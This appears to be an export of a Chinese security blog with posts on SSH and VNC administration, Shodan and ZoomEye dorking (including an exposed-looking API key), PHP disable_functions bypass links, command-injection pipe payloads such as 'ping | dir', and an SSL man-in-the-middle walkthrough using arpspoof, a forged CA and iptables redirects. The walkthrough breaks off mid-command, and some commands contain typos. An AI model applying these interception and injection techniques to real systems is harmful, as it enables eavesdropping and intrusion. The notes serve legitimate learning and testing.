私钥\n公钥加密，私钥解密；私钥加密，公钥解密\n\n生成秘钥对\n```bash\n# 1.在我的机器(客户端)产生一对， 选择rsa算法，秘钥长度选择4096\nssh-keygen -t rsa -b 4096\n\n# 修改...\n# 命名秘钥对\nssh-keygen -t rsa -b 4096 -f id_mail\n# 修改私钥密码文(这个密码要设置更加安全一点) -p， -f指定修改哪个key的\nssh-keygen -p -f ~/.ssh/id_rsa    # 有多个的话，-f指定\n\n\n# 2.设置公私钥保存的位置，和打开的密码\n# 存放在下面两个文件\n~/.ssh/id_rsa  # 私钥\n~/.ssh/id_rsa.pub  # 公钥\n#ps：know_hosts是连接过的主机\n\n# 3.把公钥文件-->传送到目标服务器上(服务器上会变成.ssh/authorized_key)\nssh-copy-id  xps@192.168.0.10  #如果有多个，-i选择公钥\n\n\n\n# 4. 建议设本地私钥文件权限\nchmod 400 .ssh/id_rsa\n# 5.服务端公钥权限也要修改\n.ssh/authorized_key\n\n# 6.现在可放心登录了(现在输入的密码是对私钥加密的密码)\nssh xps@192.168.0.10\n\n# Note：记得配置文件修改为禁止使用ssh密码登录,使用公钥登录：\nPasswordAuthentication no\nPubkeyAuthentication yes\n# Note:私钥千万不能泄露哦\n\n```\n\n\n## <font color=red>SSH隧道</font>\n通过ssh隧道，封装一些其他的服务数据，保证安全性\n\n**登录**\n```bash\nssh xps@192.168.0.10\n\n# 登录之后，不进入shell界面（只是获得会话后运行一个命令，但效果是一样的） -- 命令服务端去ping另外一台机器\n# -i指定私钥，-p指定端口\nssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1\n\n# (cstream -t限制传输速度通信带宽)拷贝文件夹到目标机器（本地打包, 在服务端解包），pv显示带宽占用情况 \n# --- 企业用的网络带宽(质量好)比家用的成本很贵\ntar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 'tar -xj'\n```\n\n\n**ssh隧道 -- 实现远程映射**\n```bash\n###### 端口映射（两个机器之间，添加一个加密的管道 来连接）\n# 映射远程端口23到本机2001端口\n#（-f端口转发,-N不占用命令行窗口, -L侦听本机的端口，localhost理解为隧道，23为目标机器端口，最后是目标机器ip）\nssh -fN -L2001:localhost:23 xps@192.168.0.10 \n# 现在，telnet本机的2001端口，就相当于通过机密的隧道来映射到目标的23端口\n# 其他类型的服务也可以封装...\n\n### 拓展：远程映射\n# 隧道的起点：我的机器，隧道的终点：'另外机器'。然后通过'另外机器',访问目标机器(sina)\n# 本机的2002端口，通过ssh隧道，映射到'另外机器'(世界上随便一个机器)的ip的80端口，\n# 用途：内网特殊的服务器运行访问外网(进行映射)，就能突破对内容不能上网的限制\n# 限制：一对一，针对的外网的某一台（提高：一个端口访问外网所有资源，自己找资料）\nssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10  \n# 再telnet 127.0.0.1:2002,就是达到了访问123.206.96.26的80端口的目的(最后的ip只是建立隧道,类似中间的一个)\n\n```\n\n\n\n<img src=\"http://image.xpshuai.cn/20200330152732562_32379.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200330154229749_5054.png\" />\n\n**ssh隧道 -- 实现文件系统挂载**\n比如，一开机，就自动把远程机器的目录/分区挂载到我本机上，跟访问本地目录一样的效果\n\n```bash\n## ssh隧道实现文件系统的挂载\n# 第一个ip的要挂载的远程机器，后面的本机目录\nsshfs xps@192.168.0.10:home/test  /mnt/myfiles\t# 远程挂载远程机器目录到本地\n# 再查看，会发现本地目录多了远程服务器目录的文件（如果网络带宽不够，性能和体验就比较差）\n# 在客户端/服务端对文件进行操作，都是可以的\numount /mnt/myfiles\t\t# 卸载1\nfusermount -u /mnt/myfiles    # 卸载2\n\n#配置文件使用持久化挂载\t\nvim /etc/fstab\nuser1@192.168.0.10:/path  /mntpotin   fuse,sshfs,\trw,noauto,user,_netdev0\n# 目标机器的路径，本机的挂载点\n```\n\n\n**SSH客户端**\n若要管理的服务器的数目众多，对每台服务器做一个方便记忆的`标签`，简化登录\n\n在本机(客户端)创建一个客户端配置文件：`~/.ssh/config`  \n内容\n```bash\nhost server1  # 别名随意\n\tHostname 192.168.1.10  # 对应主机ip，端口，用户名\n\tPort 22\n\tUser xps\n\t\nhost db2\n\tHostname 192.168.1.10\n\tPort 22\n\tUser xps\n\t\nhost mail1\n\tHostname 192.168.1.10\n\tPort 22\n\tUser xps\n```\n\n以后登录的话，直接：\n```bash\n# 直接登录别名即可(不仅方便，还隐藏了ip，更加安全)\nssh db1\n```\n\n\n\n\n## <font color=red>SSH安全</font>\n**SSH防爆破**\n密码爆破防护\n\n方法：监视：次数太多就禁止该ip访问\n\n借助`fail2ban`来实现:\nfail2ban原理：周期性的检查登录日志，对异常的ip进行屏蔽(调用防火墙实现)\n```bash\n# 安装\napt install fail2ban\n\n# 默认主配置文件，软件更新时被覆盖(`所以一般不会使用它`)   jail --> 监狱\n/etc/fail2ban/jail.conf\n# 本地配置文件，软件更新不被覆盖，优先级更高（`一般常修改这个文件`） 复制一份：cp jail.conf jail.local\n/etc/fail2ban/jail.local\n#配置项(一般只需配置几项)\n#1.全局的：\nignoreip=127.0.0.1/8 19.168.0.10  # 忽略并不进行监视的地址（受信的ip地址段）\nbantime=-1   # 禁用的时间(单位是s)， -1是永远屏蔽\nfindtime=1   # 查询间隔时间\nmaxretry=5   # 连着失败输入多少次密码，我就屏蔽你\n#2.Actions: 有异常做什么动作(比如报警邮件，默认是防火墙屏蔽)\n#3.Jails设置：针对不同类型的服务(并不仅限于ssh服务)，配置不同的（这里的优先级比全局配置项高）\n\t[sshd]\n\tecabled=true # 启用对ssh的jails\n\tfilter=sshd  # 查找的关键词\n\tlogpath = xxxxxx.log\n\t# 以ssh服务为例(见下图)\n\n# 重启服务生效 \nsudo systemctl restart fail2ban.service\n\n\n# 查看身份认证日志文件\ntail -f /var/log/auth.log\n\n# 查看jail列表(都有哪些jail，jail的情况)\nsudo fail2ban -client status\nsudo fail2ban -client status sshd # 查看ssh的jail的详细信息\n\n# 查看防火墙规则\nsudo iptables -S\nsudo iptables -L -n\n\n# 手动解除被禁IP\nsudo iptables -D f2b-sshd-s 192.168.1.111 -j REJECT   # 通过删除防火墙某一个规则 -D,  REJECT或DROP看自己的情况\nsudo fail2ban-client set sshd unbanip 192.168.1.8\n\n# 手动解除禁用之后，但是如果重启服务，会再自动查看日志：还没有超过被禁期限的ip会再次被禁\n\n```\n<img src=\"http://image.xpshuai.cn/20200330164545399_6809.png\" />\n\n\n\n\n\n## <font color=red>VNC服务</font>\n>这里只介绍vnc，还有其他更优秀的工具，但是vnc的适用范围最广\n\n图形化界面（类似于windows下的远程桌面）\n- 使用图形化界面及工具\n- 是Linux系统最通用的远程图形管理工具（通用适用于windows）\n\n安装图形环境\n```bash\n#这里安装简化版的xfce4桌面环境，这里选择vnc的一个软件包:tightvncserver. 也可以自己选择别的版本的\nsudo apt install gnome-core xfce4 xfce4-goodies tightvncserver\n\n# 一个vnc可以启动多个侦听端口(默认从5901开始)，从不同端口连接，打开不同会话(每个用户看到的桌面是不一样的)\n# 若只侦听一个端口，通过一个端口连接，多个用户看到的都是一个桌面\n\n# 建议：多用户，在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了\n```\n\n运行配置\n```bash\nvncserver  # 启动vnc服务（接下来会让你输入连接密码和只读密码）\n~/.vnc/xstartup   # 会生成运行文件\nvncserver -kill:1 # 删掉自动生成的实例（因为不一定最适合我们的桌面环境。冒号后面是1是5901,如果是2就是5902）\n# 备份一下文件\nmv xstartup xstartup.bak\n# 创建新运行文件， 手动配置适合我们xfce4的vnc配置\nvim xstartup\n\t#!/bin/bash\n\txrdb $HOME/.Xresources\n\tstartxfce4 &\n\n# 修改权限\nchmod +x ~/.vnc/xstartup\n# 重新运行\nvncserver   # tcp的5901端口\n\n# 就可以在客户端用客户端软件连接了(比如：Remote Desktop Viewer) 输入ip:端口\n\n# Note: 服务器上，能少开端口就少开端口，能少开服务就少开服务\n```\n\n多用户\n```bash\n# 每个用户不用会话\n# 在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了\nsu newuser1\nvncserver\n~/.vnc/xstartup  \nvncserver -kill:2\nvim xstartup\n\t#!/bin/bash\n\txrdb $HOME/.Xresources\n\tstartxfce4 &\n\t\nchmod +x ~/.vnc/xstartup\nvncserver :2   # tcp的5902端口\n```\n\n>ps: vnc的加密强度不是很高，所以：在不需要vnc的时候，建议杀掉vnc进程(`vncserver -kill:2`)\n\n因为 vnc的加密强度没有ssh高，所以，尝试：先建立ssh隧道，再在隧道的基础上建立图形化的连接\n\n\n\n## <font color=red>PUPPET</font>\n也是一个远程管理工具，可以不登录到被管理服务器上  \n利用puppet的服务端(我的机器)来管理puppet的客户端(安装在远程服务器上)，进行批量管理...  \n\n全生命周期的远程管理方案  \n- 软件安装部署(可以写一个脚本，然后批量下发给安装有puppet客户端的服务器上)\n- 权限设置\n- 账号管理\n- 支持云平台\n- 支持容器(Docker)\n- 适合大量服务器管理\n\n\n**准备**\n```bash\n# 这里以两台机器做实验\n# 为了区分，改一下两台计算机名\nhostnamectrl set-hostname puppet\nhostnamectrl set-hostname client\n\n# 修改hosts文件，修改解析域名(这个随便起) -- 两台机器都要修改\nvim /etv/hosts\n\t192.168.1.10\tpuppet.lab.com\t\tpuppet\n\t192.168.1.11\tclient.lab.com\t\tclient\n\t# 其他行都删掉就行\n\t# 可以在dns服务器上修改，这里通过hosts修改域名解析只是权宜之计(下一章学完DNS之后就在dns服务器修改域名的解析)\n```\n\n\n**安装**\n```bash\n# 安装puppet服务端程序\nsudo apt install puppetmaster \n\n# 安装puppet客户端程序\nsudo apt install puppet\n```\n\n**配置**\n服务端配置-1\n```bash\ncd /etc/puppet\nsudo mkdir -p modules/apache2/manifests  # manifests 目录下面就是资源文件\ntouch init.pp\n# sudo vim /etc/puppet/modules/apache2/manifests/init.pp\n\n# 比如要给下面的机器安装apache, \n# 一组资源就是一个类\nclass apache2{\n\tpackage{'apache2':   # 软件包\n\t\tensure=>installeds,\n\t}\n\tservice{'apache2':   # apache的服务是否启动\n\t\tensure=>ture,\n\t\tensure=>ture,\n\t\trequire=>Package['apache2'],  # 包的名称\n\t}\n}\n```\n\n服务端配置-2\n```bash\n# 上面的配置文件定义了资源，那么这里确定要给哪些服务器安装哪个资源\n# 选择哪个资源\ncd manifests\ntouch site.pp\n\n# sudo vim /etc/puppet/manifests/site.pp\n# 解析这个节点(通过域名解析到对应ip,只要那些计算机在这个域名即可)\nnode 'client.lab.com' {\n\t\tinclude apache2   # 选择下发哪些资源。这里以推送apache2资源为例\n}\n\n# 重启服务\nsystemctl restart puppetmaster.service\n```\n\n\n客户端配置\n```bash\n# puppet的客户端和服务端是通过证书来通信等操作的\n\n# sudo vim /etc/default/puppet          默认没有，自己新建\n\tSTART=yes\n\n# 重启服务（会自动向puppet服务端发起请求申请证书）\nsystemctl restart puppet.service\n```\n\n客户端证书前面请求测试\n```bash\n# 在查看客户端的指纹信息\nsudo puppet agent --figerprint\n# 服务端下面下发证书后，然后在客户端测试一下，获取证书\nsudo puppet agent --test\n```\n\n服务端请求查看签名\n```bash\n# 在服务端查看哪些客户端跟我发起证书请求了\nsudo puppet cert list\n# 在服务端使用自己的私钥给对应的机器进行签名(sign)\nsudo puppet cert sign client.lab.com\n\n# 客户端查看证书下发进度： sudo puppet agent --test\n```\n\n完成上面的步骤(资源的下发配置，证书的请求与签名下发，重启服务)之后，在客户端查看`apache2`的服务已经安装好并启用了\n\n日志状态信息查看\n```bash\n# 查看状态\nsystemctl status puppet.service\n\n/var/log/syslog\n\n```\n\n\n\n上面关于puppet只是简单的一小部分，后续高级用法，请自行探索\n\n\n\n\n\n\n\n\n\n\n\n","tags":["远程管理"],"categories":["Linux"]},{"title":"黑暗引擎","url":"%2Fposts%2F17232%2F","content":"\n\n \n#### 一. shodan\n\n###### 1.简单介绍\n\nShodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。\n\n###### 2.内置语法 \n\n```bash\n# Shodan的参数有很多，这里只介绍简单的几种\nhostname：\"主机或域名\"\n如 hostname:\"google''\n\nport：\"端口或服务\"\n如 port:\"21\"\n\nip : \"ip地址\"\n如 ip : \"168.205.71.64\"\n\nnet：\"IP地址或子网\"\n\n如 net:\"210.45.240.0/24\"\n\nvuln :指定漏洞的cve\n\n如 vuln:CVE-2015-8869\n\n但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160\n\nos :\"操作系统\"\n\n​ 如 os:\"centOS\"\n\nisp：\"ISP供应商\"\n\n如 isp:\"China Telecom\"\n\nproduct：\"操作系统/软件/平台\"\n\n如 product:\"Apache httpd\"\n\nversion：\"软件版本\"\n\n如 version:\"3.1.6\"\n\ngeo：\"经纬度\"\n\n如 geo:\"39.8779,116.4550\"\n\ncountry`：\"国家\"\n\n如 country:\"China\"\ncountry:\"UN\"\n\ncity：\"城市\"\n如 city:\"Hefei\"\n\norg：\"组织或公司\"\n如 org:\"google\"\n\nbefore/after：\"日/月/年\"\n如 before:\"25/09/2017\"\nafter:\"25/09/2017\"\n\nasn : \"自治系统号码\"\n如 asn:\"AS2233\"\n```\n\n###### 3.脚本使用  （建议使用本地脚本，也可自主开发）\n\n\t项目地址：https://github.com/achillean/shodan-python\n\n先clone, python setup.py install, shodan init 秘钥_value,然后可以在命令行用了就\n`shodan search product:\"apache\"`  只不过显示方式不友好\n\n\n拓展：自主开发\n\n\t官方文档：https://shodan.readthedocs.io/en/latest/index.html\n\n```python\nfrom shodan import Shodan\n\napi = Shodan(\"cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf\")\n\n# Lookup an IP\nipinfo = api.host('8.8.8.8')\nprint(ipinfo)\n\n# Search for websites that have been \"hacked\"\nfor banner in api.search_cursor('ch1_http相关.title:\"hacked by\"'):\n    print(banner)\n\n# Get the total number of industrial control systems services on the Internet\nics_services = api.count('tag:ics')\nprint('Industrial Control Systems: {}'.format(ics_services['total']))\n```\n\n\n\n###### 案例测试：\n\n1.phpstudy采集\n头部信息 `Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9`\n\n2.子域名信息采集\n`hostname:\"xps.cn\"`\n\n3.特定漏洞靶机采集\n`vuln:CVE-2020-1983` 普通用户没权限用\n\n\n\n\n\n#### 二. zoomeye\n\n>对国内更贴近一些\n\n###### 内置语法\n\n\tZoomEye搜索技巧\n\t指定搜索的组件以及版本\n\tapp：组件名称\n\tver：组件版本\n\t例如：搜索 apache组件    版本2.4\n\tapp:apache ver:2.4\n\t\n\t指定搜索的端口\n\tport:端口号\n\t例如：搜索开放了SSH端口的主机\n\tport:22\n\t一些服务器可能监听了非标准的端口。\n\t要按照更精确的协议进行检索，可以使用service进行过滤。\n\t\n\t指定搜索的操作系统\n\tOS:操作系统名称\n\t例如：搜索Linux操作系统\n\tOS：Linux\n\t\n\t指定搜索的服务\n\tservice：服务名称\n\t例如，搜素SSH服务\n\tService：SSH\n\t\n\t指定搜索的地理位置范\n\tcountry：国家\n\tcity：城市名\n\t例如：\n\tcountry:China\n\tcity：Beijing\n\t\n\t搜索指定的CIDR网段\n\tCIDR:网段区域\n\t例如：\n\tCIDR：192.168.158.12/24\n\t\n\t搜索指定的网站域名\n\tSite:网站域名\n\t例如：\n\tsite:www.baidu.com\n\t\n\t搜索指定的主机名\n\tHostname:主机名\n\t例如：\n\thostname:zwl.cuit.edu.cn\n\t\n\t搜索指定的设备名\n\tDevice：设备名\n\t例如：\n\tdevice:router\n\t\n\t搜索具有特定首页关键词的主机\n\tKeyword：关键词\n\t例如：\n\tkeyword:technology\n\n\n###### 脚本开发(多语言开发)\n\n\t官方手册:https://www.zoomeye.org/doc\n\n1.登录授权\n2.请求搜索\n3.回显数据\n\n\n\n\n#### 补充：谷歌黑客高级玩法\n\n\thttps://www.uedbox.com/shdb/\n\thttps://www.uedbox.com/post/54776/\n\n\n\n","tags":["黑暗引擎"],"categories":["渗透测试"]},{"title":"PHP常见安全设置","url":"%2Fposts%2F1940%2F","content":"\n  \n\n## PHP.INI与WEB安全\n\n  \n\n### 四种防护\n\n#### 1.magic_quotes_gpc\n\n魔术引号：` 过滤转义`四种字符（），对于sql注入有过滤作用\n\n**绕过：** 特定条件下可以尝试` 宽字节注入`     \n\n\n\n\n#### 2.safe_mod\n\n> 安全模式，官方自带的\n\n**安全模式：**  禁止php中敏感函数，防御提权及后门调用，漏洞利用\n一些敏感函数被禁用\n\n有时候不开安全模式的原因：自己开发中也需要使用到某些敏感函数，不然影响正常应用\n\n\n\n#### 3.open_basedir\n\n启用之后： open_basedir=D:\\phpstudy\\PHPTutorial\\WWW`\n限制后门的访问指定目录（菜刀连上也看不到目录里面）\n\n>没办法绕过\n\n\n\n#### 4.disable_function\n\n可`自定义禁用函数`：安全模式(safe_mod)升级版，可自定义函数禁用，更加灵活\n\n```php\ndl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link\n```\n\n举例：\n\n```php\ndisable_function = eval,system,fopen,fread,readdir,init_set    //比如禁用某指定函数的做法\n// 可以直接封杀大马小马等后门disable_functiondisable_function\n```\n\n##### 绕过\n\ndisable_function的突破:\n\n###### **方法1：** \n\n蚁剑及插件(绕过disable_function)使用, 加载插件\n插件会保存到antData/plugin目录\n现在好像已经不用自己下载这个插件了\n\n>参考文章:  https://www.cnblogs.com/linuxsec/articles/10966675.html\n\n\n\n###### **方法2：**\n\n 针对php7.x:（不支持windows）\nhttps://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php\n\n\n\n###### **方法3：**\n\n 脚本集合：\nhttps://github.com/l3m0n/Bypass_Disable_functions_Shell\nhttp://webshell8.com/down/phpwebshell.zip\n\n\n\n###### **方法4：**\n\n一些webshell自带绕过功能\n\n\n\n#### 其他\n\n目录权限\n文件解析\n\n... ...\n\n\n\n\n\n\n\n","tags":["php.ini"],"categories":["渗透测试"]},{"title":"xray简单学习","url":"%2Fposts%2F46596%2F","content":"\n# xray学习\n\n平时使用`webscan`是最多的\n\n\n结合基础爬虫\n\n```powershell\nxray.exe webscan --basic-crawler http://xxxxx\n\n# 有弊端（爬虫是不受我们控制的。如果是代理就行了:我们点哪里就扫哪里）\n```\n\n\n\n## 基本使用\n\n#### 代理\n\n###### 原理\n\n![](http://image.xpshuai.cn/xray%E8%A2%AB%E5%8A%A8%E4%BB%A3%E7%90%86.png)\n\n###### 设置代理步骤\n\n![](http://image.xpshuai.cn/xray%E8%AE%BE%E7%BD%AE%E8%A2%AB%E5%8A%A8%E4%BB%A3%E7%90%86.png)\n\n其中，证书的生成(只要程序位置不变，证书就不需要重新安装)：`ca.crt`, 然后安装证书\n\n生成报告后(可以边扫边看)，点击对应条目，我们可以看到具体的请求/响应信息等\n\n\n## 高级用法\n\n#### 1.常用配置\n\n>配置文件：config.yaml\n\n###### 允许扫描的域\n\n- Mitm -> Restriction\n  默认会把所有流量扫描，可以指定我们想要扫描的域名的流量\n  includes允许扫描的域，`*`表示任意；excludes不允许扫描的域\n\n###### 为代理添加认证\n\n- Mitm ->auth\n  如果把xray放到公网上，别人也可以使用，我们就需要设置账号密码\n\n###### 扫描插件配置\n\n- Plugins\n  插件可以打开(`enable:true`)和关闭(`false`),也可以自定义字典等  \n  或者直接在命令行指定启用哪些插件：`--plugins xss,xxe`\n\n###### 发包速率限制\n\n- http -> max_qps\n  限制扫描速度，防止被waf拉黑\n\n###### 扫描代理配置\n\n- http -> proxy\n  代理支持以下形式\n\n```\n#1.http代理\nhttp:\n  proxy: \"http://127.0.0.1:8080\" # 漏洞扫描时使用的代理\n\n#2.socks代理\nhttp:\n  proxy: \"socks5://127.0.0.1:1111\" # 漏洞扫描时使用的代理\n```\n\n**log如果改成`debug`，可以看到具体发包请求详情：**\n![](http://image.xpshuai.cn/xray_log.png)\n\n**也可以设置cookie**\n\n大致配置项：\n![](http://image.xpshuai.cn/xray_cookie.png)\n\n#### 2.xray与burp联动使用\n\n###### （1）Burpsuite作为xray的上游代理（`抓取xray发包来学习`）\n\n![](http://image.xpshuai.cn/xray_after_burp.png)\n\n**作用：**\nburp可以拿到xray的数据包（可以学习xray是如何检测的的）\n\n**设置方法：**\n\n1. xray设置代理: `http://127.0.0.1:8080`\n2. burp监听8080端口\n3. 启动xray，设置监听端口为`--listen 127.0.0.1:1111`\n4. 浏览器配置代理为`1111`\n\n\n\n###### （2）xray作为Burpsuite的上游代理（`协助测试`）\n\n![](http://image.xpshuai.cn/xray_before_burp.png)\n\n**作用：**\nburp可以选择是否放行，forward之后，可以用xray进行扫描\n\n**设置方法：**\n\n1. xray配置文件不配置代理\n2. burp正常设置监听8080端口\n3. burp打开`user option -> Upstream Proxy Server -> 添加为:127.0.0.1:1111`\n4. 浏览器设置burp代理8080\n5. 启动xray，设置监听端口为`--listen 127.0.0.1:1111` \n\n**其他方式：**\n使用插件\n\n\n\n\n## 使用xray编写自定义poc\n\nxray是用go语言开发的  \npoc是yaml格式的\n\n###### 原理\n\n![](http://image.xpshuai.cn/xray_poc.png)\n\n每个规则都是http请求，进行改造\n\n\n###### POC构成\n\n- name\n- rules：最关键部分。请求方法,路径,表达式(有唯一的返回值)。支持多条(就会发送几条数据包)\n- details：漏洞检测成功之后，输出一些提示信息\n  ![](http://image.xpshuai.cn/poc.png)\n\n\n\n###### 具体操作\n\n>看官方文档\n\nvscode和jetBrain都行\n\nvscode安装`YAML`查看，配置文件`setting.json`用来校验\n\n按照上面的格式编写  \n\n运行：`xray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111 `\n\n对单个url扫描：\n`--url http://www.test.com` 更好用\n\nNote:\tphantasm这里是在命令行启用\n\n\n\n详细内容查看官方文档\n\n\n> 调试poc的方法：设置上游代理为burp，在burp查看xray发送的数据包","tags":["xray"],"categories":["渗透测试"]},{"title":"常见的管道符","url":"%2Fposts%2F62311%2F","content":"  \n#### 常见的管道符：\n  \n###### Windows：\n\n` | `    直接执行后面的语句\n` || `    如果前面出错（即为false），就执行后面的语句（前面只能为假）\n` & `    如果前面的语句为假则直接执行后面的语句（前面可真可假）\n` && `    如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真）\n\n\n###### Linux：\n\n`  ;  `    执行完前面再执行后面\n`  |  `    显示后面语句的执行结果\n`  || `    前面语句出错时，执行后面的语句\n`  &  `    如果前面的语句为假则直接执行后面的语句（前面可真可假）\n`  && `     如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真）\n\n\n\n\n\n\n\n#### 命令执行简介\n\n程序如果提供执行 命令的功能\n比如提供了ping的功能： 输入 `ping | dir`,  利用了管道符执行了dir\n\nphp中常见的执行系统 命令的函数：\n\n```php\n system, exec, shell_exec, passthru, popen, proc_popen\n```\n\n\n\n###### 修复建议\n\n- 尽量不要使用系统命令执行函数\n- 对客户端提交的变量进行过滤和检测\n- 使用动态函数之前，确保使用的函数是置顶的函数之一\n- 对php来说，不能完全控制的危险函数最好不要使用\n\n","tags":["常见的管道符"],"categories":["渗透测试"]},{"title":"HTTPS攻击","url":"%2Fposts%2F33956%2F","content":"\n\n\n\n\n# HTTPS攻击\n\n防止恶意注入、DNS劫持\n\n\n#### https的作用\n- C I A \n- 解决的是信息`传输过程中`数据被篡改、窃取\n- 加密：对称、非对称、单向(Hash)\n\n\n#### https攻击方法\n- 降级攻击\n\n- 解密攻击（明文、证书伪造）-- 劫持\n\n- 协议漏洞、实现方法的漏洞、配置不严格\n\n   \n\n##### 常识\n\n`SSL`（安全套接层, Secure socket layer）,后来使用`TSL`取代了SSL，只不过习惯了叫SSL\n\n\n\n**SSL/TLS也被用于其他场景的传输通道加密：**\n\n- 邮件传输（服务器间、客户端与服务器间）\n- 数据库服务器间\n- LDAP身份认证服务器间\n- SSL VPN\n- 远程桌面RDP通信过程中的加密和身份认证\n\n\n\n**Web通信中SSL加密**\n\n- 公钥证书（受信任的第三方证书颁发机构签名颁发）\n- 常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec\n\n\n\n**加密过程：**握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输\n\n\n\n**非对称加密算法**\n\n非对称加密一般用来加密比较小的数据\n例如：RSA, ECC等\n\n**对称加密算法**\n\nDES/3DES, AES, IDEA, RC4 ......\n\n**单向加密算法(Hash)**\n\n| Hash算法 | Hash值长度(bit) |\n| -------- | --------------- |\n| MD5      | 128             |\n| SHA-1    | 160             |\n| SHA-2    | 224,256,384,512 |\n\n**SSL的弱点**\n\n- SSL是不同的对称、非对称、单项加密算法的组合加密实现(`cipher suite`)\n- 服务器端为提供更好的兼容性，选择支持大量过时cipher suite\n- 协商过程中墙皮降级加密强度\n- 现代处理器计算能力可以在可接受的时间内破解过时加密算法\n- 购买云计算资源破解\n\n\n\n##### 实践\n\n> 查看web站点用了啥样的ssl协议，什么版本，什么组合  \n\n###### 1.`openssl`命令\n\n```bash\nopenssl s_client --connect www.baidu.com:443\n\n#证书颁发机构也是树形结构的，有一级二级\n\n#指定查看是否支持某协议和组合\nopenssl s_client -tls1_2 -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect www.taobao.com:443\n\n# 测试是否可以跟已知的不安全的cipher suite建立连接\nopenssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.taobao.com:443\n\n# 已知的不安全的组合cipher suite\nopenssl ciphers -v 'NULL,EXPORT,LOW,DES'\n\n# 参考网站（加密技术）\nhttps://www.openssl.org/docs/apps/ciphers.html\n```\n![](http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png)\n\nOpenssl需要大量密码学相关知识，命令复杂，结果可读性差\n\n\n\n###### 2.`SSLScan`工具\n\n- 自动识别ssl配置错误、过期协议、过时cipher suite和hash算法\n- 默认会检查CRIME、心脏出血漏洞\n- 绿色表示安全，红色黄色需要引起注意\n\n\n\n查看TLS支持的cipher suite\n\n```bash\n# 检查所有的支持的tls是否有不安全的\nsslscan --tlsall www.taobao.com:443\n\n# Altnames选项下面的域名也可以使用上面域名的证书\n```\n分析证书详细信息\n```bash\nsslscan --show-certificate -no-ciphersuites www.taobao.com:443\n```\n\n\n\n###### 3.`SSLyze`工具\n\n- Python编写\n- 检查ssl过时版本\n- 检查存在弱点的cipher suite\n- 扫描多站点时，支持来源文件(多个站点放到一个文件里面)\n- 检查是否支持会话恢复\n\n```bash\nsslyze --regular  www.supercomputerboytony.cn\n\n```\n\n\n\n###### 4.`Nmap`\n\n```bash\n# 枚举cipher suite\nnmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn\n```\n\n\n\n###### 5. 在线网站：\n\n输入域名，对SSL进行检测\nhttps://www.ssllabs.com/ssltest\n\n-----------------------------\n\n\n\n\n\n# SSL中间人攻击\n\n#### 概述\n\n攻击者位于客户端和服务器通信链路中\n\n- 1.ARP欺骗（最常用）\n- 2.DHCP\n如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播)\n- 3.修改网关\n- 4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置)\n- 5.修改HOSTS\n- 6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议)  --->如果处在同一局域网\n\n>不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习\n\n加密流量\n\n![](http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png)\n\n\n\n> ps：下来的演示，是基于ARP欺骗的：\n\n\n\n#### 利用\n\n##### 攻击的前提\n\n- 客户端已经信任了伪造证书颁发机构\n- 攻击者控制了核发证书颁发机构（CA证书服务器）\n- 客户端程序禁止了显示证书错误告警信息\n- 攻击者已经控制客户端，并强制其信任伪造证书\n\n##### 工具\n对已经实现中间人欺骗(这里用`arpspoof`)后，下面的工具对信息进行解密\n\n###### 1.`SSLsplit`工具\n- 透明SSL/TLS中间人攻击工具\n- 对客户端伪装成服务器，对服务器伪装成普通客户端\n- 伪装服务器需要伪造证书（利用`openssl`来生成伪造的证书）\n- 支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击\n\n**1). openssl**\n\n```bash\n# 1.利用openssl生成证书私钥\nopenssl genrsa -out ca.key 2048\n\n# 2.利用私钥签名生成证书(生效时间,使用的私钥文件)  -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的\nopenssl req -new -x509 -days 1096 -key ca.key -out ca.crt\n\n# 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实）\n```\n\n**2).攻击机器设置路由转发**\n下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）：\n\n做个地址转换, 比如:  把我计算机443端口收到的数据包转发到8443端口\n\n```bash\n# 先查看要用到的端口有没有被占用\nnetstst -pantu |grep :80\n\n# 查看nat表\niptables -t nat -L\n\n# -F  清空\niptables -t nat -F\n\n# 端口转发命令（PREROUTING在路由之前,-p协议, -j操作）\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080\niptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443\niptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443   # MSA\niptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443    # SMTPS 发邮件\niptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443\t# IMAPS    收邮件\niptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 